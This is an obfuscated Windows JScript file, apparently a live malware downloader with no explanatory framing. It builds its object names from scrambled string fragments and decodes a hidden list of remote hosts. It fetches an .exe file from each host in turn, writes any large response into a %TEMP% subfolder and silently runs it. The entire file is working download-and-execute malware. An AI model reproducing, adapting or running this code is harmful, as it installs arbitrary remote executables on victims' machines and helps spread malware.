

function URuOUIdzB(jmAjNOmEWvM) {
var eIQZxdVQ = WScript.CreateObject("Wscript.Shell");
eIQZxdVQ.Run(jmAjNOmEWvM, 0x1, 0x0);
}
function IdCkSWHTL(XErFu,kQPQj,zRdaB) {
var hDzzQ = "zejFsU XAp pt.Shell VlcoRHW Scri".split(" ");
var RJV=((1)?"W" + hDzzQ[4]:"")+hDzzQ[2];
var Vq = WScript.CreateObject(RJV);
var Zn = "%TEMP%\\";
return Vq.ExpandEnvironmentStrings(Zn);
}
function gmQHVuQd() {
var giNXHUh = "ipting";
var ceJlcGYoRF = "ile";
var VcEpc = "System";
return "Sc" + "r" + giNXHUh + ".F" + ceJlcGYoRF + VcEpc + "Obj" + "ect";
}
function Bukc(XHFzg) {
return WScript.CreateObject(XHFzg);
}
function gBcd(vrSpS,xJLuA) {
vrSpS.write(xJLuA);
}
function KmVc(yfTYE) {
yfTYE.open();
}
function XUNw(ZTtmp,vapic) {
ZTtmp.saveToFile(vapic,505-503);
}
function IiLf(wRwJa,KyEJq,lMFUG) {
wRwJa.open(lMFUG,KyEJq,false);
}
function LVfT(lSMHS) {
if (lSMHS == 1091-891){return true;} else {return false;}
}
function Xrwt(pvEnU) {
if (pvEnU > 152961-533){return true;} else {return false;}
}
function Mopi(JQKDH) {
var iBAuE="";
for(e=(631-631); e < JQKDH.length; e++)
if (e % (890-888) != (643-643)) {
iBAuE += JQKDH.substr(e, 964-963);
}
return iBAuE;
}
function wdZN(dhZoj) {
dhZoj.send();
}
function QkJB(dMccY) {
return dMccY.status;
}
var Gf="PtkhNiLs6ijsCittSsSqpqb.AcoocmA/Y6j96.2eRx9eA?M ZoXhgi1yNonuhn6g7b4uUyAfnfB.ycnopmM/66p9P.nekxdex?z W?n q?0 G?";
var h = Mopi(Gf).split(" ");
var IKS = IdCkSWHTL("LVtd","PIpdP","LJGvzI");
var wMu = new ActiveXObject(gmQHVuQd());
var AMLr = IKS+"zgHRnzy\\";
try{
wMu.CreateFolder(AMLr);
}catch(PhFWFT){
};
var fas = "2.XMLH";
var OZK = (fas + "TTP" + " XQXAIfF FFJHi XML ream St GuRPRvBf AD MdZgsqA OD").split(" ");
var Ra = true  , vBlN = OZK[7] + "" + OZK[9];
var IF = Bukc("MS"+OZK[3]+(465829, OZK[0]));
var RqS = Bukc(vBlN + "B." + OZK[5]+(146669, OZK[4]));
var ycR = 0;
var q = 1;
var xveVSxM = 989789;
var t=ycR;
while (true)  {
if(t>=h.length) {break;}
var uo = 0;
var CDV = ("ht" + " ZUgYnBn tp ZIzPf UHZShsvG :// UODdRDv .exe  GET").split(" ");
try  {
IiLf(IF,CDV[0]+CDV[2]+CDV[5]+h[t]+q, "GET"); wdZN(IF); if (LVfT(QkJB(IF)))  {      
KmVc(RqS); RqS.type = 1; gBcd(RqS,IF.responseBody); if (Xrwt(RqS.size))  {
uo = 1; RqS.position = 0; XUNw(RqS,/*Cw6B31ovy5*/AMLr/*Oy4l60gKP5*/+xveVSxM+CDV[7]); try  {
if (((new Date())>0,7849785888)) {
URuOUIdzB(AMLr+xveVSxM+/*yClT24HvmW*/CDV[7]/*l4NR36dI4V*/); 
break;
}
}
catch (jb)  {
}; 
}; RqS.close(); 
}; 
if (uo == 1)  {
ycR = t; break; 
}; 
}
catch (jb)  { 
}; 
t++;
}; 

